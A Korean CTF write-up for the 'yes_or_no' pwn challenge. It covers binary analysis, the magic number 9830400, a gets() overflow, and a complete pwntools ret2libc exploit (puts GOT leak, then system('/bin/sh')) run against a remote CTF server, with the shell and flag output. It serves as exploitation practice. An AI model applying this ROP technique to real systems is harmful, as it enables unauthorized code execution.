# Yes or no

```c
kimdong@ubuntu  ~/Wargame  file yes_or_no
yes_or_no: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=158605ccf96853e14f44588013ef526ef95aa3da, not stripped

kimdong@ubuntu  ~/Wargame  checksec yes_or_no
[*] '/home/kimdong/Wargame/yes_or_no'
   Arch:     amd64-64-little
   RELRO:    Partial RELRO
   Stack:    No canary found
   NX:       NX enabled
   PIE:      No PIE (0x400000)
   ```

이번 바이너리 파일은 실행파일 이외에도 `libc-2.27.so `라는 libc파일 까지 같이 주어졌다.<br>
mitigation으로는 NX비트가 설정되어 있고,64-bit이다.<br>

```c
kimdong@ubuntu  ~/Wargame  ./yes_or_no
Show me your number~!
aaaa
Sorry. You can't come with us
```
바이너리를 실행시키면 다음과 같이 문자열이 출력된후에 사용자의 입력값을 받는다.<br>
일정 알고리즘에 따라 검증후에 다시 문자열이 출력된다.<br>

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int v4; // eax
  int v5; // ecx
  int v6; // eax
  int v7; // eax
  char s; // [rsp+Eh] [rbp-12h]
  int v10; // [rsp+18h] [rbp-8h]
  int v11; // [rsp+1Ch] [rbp-4h]

  setvbuf(stdout, 0LL, 2, 0LL);
  v11 = 5;
  puts("Show me your number~!");
  fgets(&s, 10, stdin);
  v10 = atoi(&s);
  if ( (v11 - 10) >> 3 < 0 )
  {
    v4 = 0;
  }
  else
  {
    v3 = v11++;
    v4 = v10 - v3;
  }
  if ( v4 == v10 )
  {
    puts("Sorry. You can't come with us");
  }
  else
  {
    v5 = 1204 / ++v11;
    v6 = v11++;
    if ( v10 == (v6 * v5) << (++v11 % 20 + 5) )
    {
      puts("That's cool. Follow me");
      gets(&s);
    }
    else
    {
      v7 = v11--;
      if ( v10 == v7 )
      {
        printf("Why are you here?");
        return 0;
      }
      puts("All I can say to you is \"do_system+1094\".\ngood luck");
    }
  }
  return 0;
}
 ```
 ida로 보면 main문에서 `if ( v10 == (v6 * v5) << (++v11 % 20 + 5) )`이 부분이 문제를 해결할수있는 포인트로 보인다.<br>
 따라서 디버깅을 통해 어떤값과 비교하는지 확인해보자.<br>


 ```c
 gef➤  disas main
Dump of assembler code for function main:
   0x00000000004006c7 <+0>:	push   rbp
   0x00000000004006c8 <+1>:	mov    rbp,rsp
   0x00000000004006cb <+4>:	sub    rsp,0x20
   0x00000000004006cf <+8>:	mov    rax,QWORD PTR [rip+0x20098a]        # 0x601060 <stdout@@GLIBC_2.2.5>
   0x00000000004006d6 <+15>:	mov    ecx,0x0
   0x00000000004006db <+20>:	mov    edx,0x2
   0x00000000004006e0 <+25>:	mov    esi,0x0
   0x00000000004006e5 <+30>:	mov    rdi,rax
   0x00000000004006e8 <+33>:	call   0x4005c0 <setvbuf@plt>
   0x00000000004006ed <+38>:	mov    DWORD PTR [rbp-0x4],0x5
   0x00000000004006f4 <+45>:	lea    rdi,[rip+0x1ad]        # 0x4008a8
   0x00000000004006fb <+52>:	call   0x400580 <puts@plt>
   0x0000000000400700 <+57>:	mov    rdx,QWORD PTR [rip+0x200969]        # 0x601070 <stdin@@GLIBC_2.2.5>
   0x0000000000400707 <+64>:	lea    rax,[rbp-0x12]
   0x000000000040070b <+68>:	mov    esi,0xa
   0x0000000000400710 <+73>:	mov    rdi,rax
   0x0000000000400713 <+76>:	call   0x4005a0 <fgets@plt>
   0x0000000000400718 <+81>:	lea    rax,[rbp-0x12]
   0x000000000040071c <+85>:	mov    rdi,rax
   0x000000000040071f <+88>:	mov    eax,0x0
   0x0000000000400724 <+93>:	call   0x4005d0 <atoi@plt>
   0x0000000000400729 <+98>:	mov    DWORD PTR [rbp-0x8],eax
   0x000000000040072c <+101>:	mov    eax,DWORD PTR [rbp-0x4]
   0x000000000040072f <+104>:	sub    eax,0xa
   0x0000000000400732 <+107>:	sar    eax,0x3
   0x0000000000400735 <+110>:	test   eax,eax
   0x0000000000400737 <+112>:	js     0x40074b <main+132>
   0x0000000000400739 <+114>:	mov    eax,DWORD PTR [rbp-0x4]
   0x000000000040073c <+117>:	lea    edx,[rax+0x1]
   0x000000000040073f <+120>:	mov    DWORD PTR [rbp-0x4],edx
   0x0000000000400742 <+123>:	mov    edx,DWORD PTR [rbp-0x8]
   0x0000000000400745 <+126>:	sub    edx,eax
   0x0000000000400747 <+128>:	mov    eax,edx
   0x0000000000400749 <+130>:	jmp    0x400750 <main+137>
   0x000000000040074b <+132>:	mov    eax,0x0
   0x0000000000400750 <+137>:	cmp    eax,DWORD PTR [rbp-0x8]
   0x0000000000400753 <+140>:	jne    0x400766 <main+159>
   0x0000000000400755 <+142>:	lea    rdi,[rip+0x162]        # 0x4008be
   0x000000000040075c <+149>:	call   0x400580 <puts@plt>
   0x0000000000400761 <+154>:	jmp    0x40080a <main+323>
   0x0000000000400766 <+159>:	add    DWORD PTR [rbp-0x4],0x1
   0x000000000040076a <+163>:	mov    eax,0x4b4
   0x000000000040076f <+168>:	cdq    
   0x0000000000400770 <+169>:	idiv   DWORD PTR [rbp-0x4]
   0x0000000000400773 <+172>:	mov    ecx,eax
   0x0000000000400775 <+174>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000400778 <+177>:	lea    edx,[rax+0x1]
   0x000000000040077b <+180>:	mov    DWORD PTR [rbp-0x4],edx
   0x000000000040077e <+183>:	mov    esi,ecx
   0x0000000000400780 <+185>:	imul   esi,eax
   0x0000000000400783 <+188>:	add    DWORD PTR [rbp-0x4],0x1
   0x0000000000400787 <+192>:	mov    ecx,DWORD PTR [rbp-0x4]
   0x000000000040078a <+195>:	mov    edx,0x66666667
   0x000000000040078f <+200>:	mov    eax,ecx
   0x0000000000400791 <+202>:	imul   edx
   0x0000000000400793 <+204>:	sar    edx,0x3
   0x0000000000400796 <+207>:	mov    eax,ecx
   0x0000000000400798 <+209>:	sar    eax,0x1f
   0x000000000040079b <+212>:	sub    edx,eax
   0x000000000040079d <+214>:	mov    eax,edx
   0x000000000040079f <+216>:	shl    eax,0x2
   0x00000000004007a2 <+219>:	add    eax,edx
   0x00000000004007a4 <+221>:	shl    eax,0x2
   0x00000000004007a7 <+224>:	sub    ecx,eax
   0x00000000004007a9 <+226>:	mov    edx,ecx
   0x00000000004007ab <+228>:	lea    eax,[rdx+0x5]
   0x00000000004007ae <+231>:	mov    ecx,eax
   0x00000000004007b0 <+233>:	shl    esi,cl
   0x00000000004007b2 <+235>:	mov    eax,esi
   0x00000000004007b4 <+237>:	cmp    DWORD PTR [rbp-0x8],eax
   0x00000000004007b7 <+240>:	jne    0x4007d8 <main+273>
   0x00000000004007b9 <+242>:	lea    rdi,[rip+0x11c]        # 0x4008dc
   0x00000000004007c0 <+249>:	call   0x400580 <puts@plt>
   0x00000000004007c5 <+254>:	lea    rax,[rbp-0x12]
   0x00000000004007c9 <+258>:	mov    rdi,rax
   0x00000000004007cc <+261>:	mov    eax,0x0
   0x00000000004007d1 <+266>:	call   0x4005b0 <gets@plt>
   0x00000000004007d6 <+271>:	jmp    0x40080a <main+323>
   0x00000000004007d8 <+273>:	mov    eax,DWORD PTR [rbp-0x4]
   0x00000000004007db <+276>:	lea    edx,[rax-0x1]
   0x00000000004007de <+279>:	mov    DWORD PTR [rbp-0x4],edx
   0x00000000004007e1 <+282>:	cmp    DWORD PTR [rbp-0x8],eax
   0x00000000004007e4 <+285>:	jne    0x4007fe <main+311>
   0x00000000004007e6 <+287>:	lea    rdi,[rip+0x106]        # 0x4008f3
   0x00000000004007ed <+294>:	mov    eax,0x0
   0x00000000004007f2 <+299>:	call   0x400590 <printf@plt>
   0x00000000004007f7 <+304>:	mov    eax,0x0
   0x00000000004007fc <+309>:	jmp    0x40080f <main+328>
   0x00000000004007fe <+311>:	lea    rdi,[rip+0x103]        # 0x400908
   0x0000000000400805 <+318>:	call   0x400580 <puts@plt>
   0x000000000040080a <+323>:	mov    eax,0x0
   0x000000000040080f <+328>:	leave  
   0x0000000000400810 <+329>:	ret
   ```

   main+237부분에서 eax에는 어떤 값이 들어있는지 확인해보자.<br>

   ```c
   gef➤  b *0x00000000004007b4
Breakpoint 3 at 0x4007b4
gef➤  r
Starting program: /home/kimdong/Wargame/yes_or_no
Show me your number~!
123456
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x960000          
$rbx   : 0x0               
$rcx   : 0xd               
$rdx   : 0x8               
$rsp   : 0x00007fffffffe3f0  →  0x0000000000400820  →  <__libc_csu_init+0> push r15
$rbp   : 0x00007fffffffe410  →  0x0000000000400820  →  <__libc_csu_init+0> push r15
$rsi   : 0x960000          
$rdi   : 0xa               
$rip   : 0x00000000004007b4  →  <main+237> cmp DWORD PTR [rbp-0x8], eax
$r8    : 0x00007fffffffe404  →  0x0001e2400000000a
$r9    : 0x0               
$r10   : 0x00007ffff7b82cc0  →  0x0002000200020002
$r11   : 0xa               
$r12   : 0x00000000004005e0  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffe4f0  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000

──────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4007a8 <main+225>       ror    DWORD PTR [rcx+0x5428dca], 0x89
     0x4007af <main+232>       rcl    ebx, 0xe6
     0x4007b2 <main+235>       mov    eax, esi
 →   0x4007b4 <main+237>       cmp    DWORD PTR [rbp-0x8], eax
     0x4007b7 <main+240>       jne    0x4007d8 <main+273>
     0x4007b9 <main+242>       lea    rdi, [rip+0x11c]        # 0x4008dc
     0x4007c0 <main+249>       call   0x400580 <puts@plt>
     0x4007c5 <main+254>       lea    rax, [rbp-0x12]
     0x4007c9 <main+258>       mov    rdi, rax
──────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "yes_or_no", stopped, reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4007b4 → main()
────────────────────────────────────────────────────────────
gef➤  x/gx $eax
0x960000:	Cannot access memory at address 0x960000
```
eax레지스터에는 `0x960000`이라는 값이 들어있다.<br>
0x960000은 9,830,400‬이다.<br>

```c
kimdong@ubuntu  ~/Wargame  ./yes_or_no
Show me your number~!
9830400
That's cool. Follow me
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[1]    3364 segmentation fault (core dumped)  ./yes_or_no
```
다음과 같이 9830400이라는 값을 넣으면 That's cool이라는 문자열이 나오고 gets로 문자열을 받기 때문에, 길이값을 검증하지 않는다.<br>
NX비트가 설정되어 있으므로, 쉘코드는 사용이 불가하고, rop gadget을 통해 익스플로잇을 해야할것 같다.<br>
일단, libc의 base address를 구하고, system함수의 주소를 구한뒤에 `/bin/sh` 문자열을 입력하여 쉘을 띄워야할것같다.<br>
libc의 `base address`를 구하기 위해서는 puts()의 주소에서 offset을 빼면 `libc_base`를 구할수있다.<br>
그후에, system과 /bin/sh의 offset을 구한뒤에, libc_base에 더해 실제 주소를 구하면 된다.<br>

puts() 함수는 인자가 하나이므로 pop rdi ; ret ; 가젯이 필요하다.<br>

```c
kimdong@ubuntu  ~/Wargame  ./rp-lin-x64 -f yes_or_no -r 1 |grep "pop rdi"
0x00400883: pop rdi ; ret  ;  (1 found)
kimdong@ubuntu  ~/Wargame  ./rp-lin-x64 -f yes_or_no -r 1 |grep "ret"
0x0040056e: ret  ;  (1 found)
```

가젯을 구했으니, puts()를 통해 libc_base주소를 구한뒤에, main문으로 돌아와서 다시 payload보내는 식으로 진행할 예정이다.<br>

---

## Exploit Code
```c
from pwn import *
p = remote ("ctf.j0n9hyun.xyz",3009)
e = ELF("./yes_or_no")
libc = ELF("./libc-2.27.so")
puts_plt = e.plt["puts"]
puts_got = e.got["puts"]
main = e.symbols["main"]

puts_offset = libc.symbols["puts"]
system_offset = libc.symbols["system"]
binsh_offset = list(libc.search('/bin/sh\x00'))[0]

pr = 0x400883
r = 0x40056e
dummy = "a"*26

payload1 = dummy
payload1 += p64(pr)
payload1 += p64(puts_got)
payload1 += p64(puts_plt)
payload1 += p64(main)

p.sendline("9830400")
p.recvuntil("Follow me\n")
p.sendline(payload1)
puts_addr = u64(str(p.recv(6))+'\x00\x00')
print hex(puts_addr)
libc_addr = puts_addr - puts_offset
system_addr = libc_addr + system_offset
binsh_addr = libc_addr + binsh_offset
p.sendline("9830400")
p.recvuntil("That's cool. Follow me\n")

payload2 = dummy
payload2 += p64(pr)
payload2 += p64(binsh_addr)
payload2 += p64(r)
payload2 += p64(system_addr)

p.sendline(payload2)
p.interactive()
```

```c
kimdong@ubuntu  ~/Wargame  python yes_or_no_ex.py
[+] Opening connection to ctf.j0n9hyun.xyz on port 3009: Done
[*] '/home/kimdong/Wargame/yes_or_no'
   Arch:     amd64-64-little
   RELRO:    Partial RELRO
   Stack:    No canary found
   NX:       NX enabled
   PIE:      No PIE (0x400000)
[*] '/home/kimdong/Wargame/libc-2.27.so'
   Arch:     amd64-64-little
   RELRO:    Partial RELRO
   Stack:    Canary found
   NX:       NX enabled
   PIE:      PIE enabled
0x7fa894e6f9c0
[*] Switching to interactive mode
$ ls
flag
main
$ cat flag
HackCTF{}
```

## END !
